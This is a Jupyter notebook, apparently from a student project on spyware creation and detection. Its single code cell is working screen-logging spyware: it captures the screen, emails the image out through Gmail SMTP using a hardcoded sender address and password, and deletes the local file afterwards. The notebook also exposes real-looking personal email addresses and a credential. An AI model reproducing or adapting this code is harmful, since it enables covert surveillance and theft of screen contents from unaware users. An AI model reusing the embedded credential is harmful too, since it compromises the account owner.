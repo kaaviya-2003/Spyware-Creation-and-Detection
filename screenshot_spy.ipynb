{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "23eba912",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "import pyscreenshot\n",
    "import smtplib\n",
    "import os\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.image import MIMEImage\n",
    "from email.mime.base import MIMEBase\n",
    "\n",
    "\n",
    "sender_email = 'vishnuk010101@gmail.com'\n",
    "sender_password = 'foqvfrqjuogwsbda'\n",
    "receiver_email = 'sa0vishnu1@gmail.com'\n",
    "subject = 'Screenlogging Data'\n",
    "body = 'System Details'\n",
    "\n",
    "class screen_logger:\n",
    "    def __init__(self, time_interval, email, password):\n",
    "        self.interval = time_interval\n",
    "        self.log = \"System Details\"\n",
    "        self.email = email\n",
    "        self.password = password\n",
    "    \n",
    "    def ssSave(self):\n",
    "        img = pyscreenshot.grab()\n",
    "        filename = \"C:\\\\Users\\\\Vishnu\\\\Documents\\\\ism\\\\screenshot1000.png\"\n",
    "        img.save(filename)\n",
    "        return filename\n",
    "    \n",
    "    def report(self):\n",
    "        filename = self.ssSave()\n",
    "        with open(filename, 'rb') as f:\n",
    "            img_data = f.read()\n",
    "        msg = MIMEMultipart()\n",
    "        msg['From'] = self.email\n",
    "        msg['To'] = self.email\n",
    "        msg['Subject'] = subject\n",
    "        msg.attach(MIMEText(body))\n",
    "        msg.attach(MIMEImage(img_data))\n",
    "        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:\n",
    "            smtp.starttls()\n",
    "            smtp.login(self.email, self.password)\n",
    "            smtp.send_message(msg)\n",
    "        os.remove(filename)\n",
    "    \n",
    "    def run(self):\n",
    "        self.report()\n",
    "\n",
    "logger = screen_logger(10, sender_email, sender_password)\n",
    "logger.run()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
